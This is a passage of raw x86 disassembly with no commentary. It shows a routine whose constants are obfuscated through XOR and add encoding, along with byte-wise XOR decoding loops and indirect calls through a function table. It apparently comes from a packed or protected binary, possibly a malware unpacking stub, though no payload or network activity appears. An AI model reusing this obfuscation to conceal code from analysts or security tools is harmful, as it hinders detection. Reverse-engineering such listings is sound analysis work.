  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
